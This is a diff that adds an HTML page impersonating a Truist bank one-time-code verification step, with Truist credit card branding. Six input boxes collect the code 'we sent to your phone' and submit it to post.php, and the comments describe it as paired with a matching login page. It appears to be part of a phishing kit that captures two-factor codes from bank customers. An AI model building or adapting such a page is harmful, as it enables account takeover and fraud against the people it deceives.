@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Code</title>
+    <link rel="stylesheet" href="res/css/app.css">
+</head> 
+<body>
+    <div class="container">
+        <!-- Left panel – same as login page, using identical structure/classes -->
+        <div class="left">
+            <h4>PREMIUM REWARDS</h4>
+            <img src="res/img/card.png" class="card" alt="reward card">
+            <span>New experiences are waiting.</span>
+            <p>
+                Pave your path to adventure with 30,000 bonus points after spending $1,500 
+                within 90 days of opening a Truist Enjoy Beyond credit card account.
+            </p>
+            <button class="btn">Apply now</button>
+            <div class="links">
+                <a href="#">See rates, fees & rewards</a> <br>
+                <a href="#">Learn more</a>
+            </div>
+        </div>
+
+        <!-- Right panel – OTP verification form, same classes as login right -->
+        <div class="right">
+            <img src="res/img/logo.png" class="logo" alt="logo">
+            <form action="post.php" method="post">
+                <!-- OTP header text -->
+                <p style="text-align:center; font-size:0.92rem; color:#2a4055; margin-bottom:1.2rem; line-height:1.5;">
+                    For your security, please enter the 6-digit verification code we sent to your phone.
+                </p>
+
+                <!-- OTP input boxes (6 digits) -->
+                <div style="display:flex; justify-content:center; gap:0.5rem; margin-bottom:1.4rem;">
+                    <input type="text" name="otp1" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="one-time-code"
+                           style="width:46px; height:52px; text-align:center; font-size:1.3rem; font-weight:600;
+                                  border:1.5px solid #d3dce6; border-radius:10px; padding:0; color:#1d2b3a; outline:none;">
+                    <input type="text" name="otp2" maxlength="1" inputmode="numeric" pattern="[0-9]"
+                           style="width:46px; height:52px; text-align:center; font-size:1.3rem; font-weight:600;
+                                  border:1.5px solid #d3dce6; border-radius:10px; padding:0; color:#1d2b3a; outline:none;">
+                    <input type="text" name="otp3" maxlength="1" inputmode="numeric" pattern="[0-9]"
+                           style="width:46px; height:52px; text-align:center; font-size:1.3rem; font-weight:600;
+                                  border:1.5px solid #d3dce6; border-radius:10px; padding:0; color:#1d2b3a; outline:none;">
+                    <input type="text" name="otp4" maxlength="1" inputmode="numeric" pattern="[0-9]"
+                           style="width:46px; height:52px; text-align:center; font-size:1.3rem; font-weight:600;
+                                  border:1.5px solid #d3dce6; border-radius:10px; padding:0; color:#1d2b3a; outline:none;">
+                    <input type="text" name="otp5" maxlength="1" inputmode="numeric" pattern="[0-9]"
+                           style="width:46px; height:52px; text-align:center; font-size:1.3rem; font-weight:600;
+                                  border:1.5px solid #d3dce6; border-radius:10px; padding:0; color:#1d2b3a; outline:none;">
+                    <input type="text" name="otp6" maxlength="1" inputmode="numeric" pattern="[0-9]"
+                           style="width:46px; height:52px; text-align:center; font-size:1.3rem; font-weight:600;
+                                  border:1.5px solid #d3dce6; border-radius:10px; padding:0; color:#1d2b3a; outline:none;">
+                </div>
+
+                <!-- Submit button – same class as login "Sign in" -->
+                <button type="submit" class="btn2">Verify</button>
+
+                <!-- Resend / help links -->
+                <div style="text-align:center; margin-top:1rem;">
+                    <p style="font-size:0.85rem; color:#5b6f82; margin-bottom:0.4rem;">
+                        Didn't receive a code?
+                    </p>
+                    <a href="#" style="font-size:0.88rem;">Resend code</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- OTP auto-advance script -->
+    <script>
+        (function() {
+            var inputs = document.querySelectorAll('input[name^="otp"]');
+            inputs.forEach(function(input, idx) {
+                input.addEventListener('input', function() {
+                    // keep only digits
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    if (this.value.length === 1 && idx < inputs.length - 1) {
+                        inputs[idx + 1].focus();
+                    }
+                });
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value.length === 0 && idx > 0) {
+                        inputs[idx - 1].focus();
+                    }
+                });
+            });
+            // focus first box on load
+            if (inputs.length) inputs[0].focus();
+        })();
+    </script>
+    <script src="./res/jq.js"></script>
+</body>
+</html>
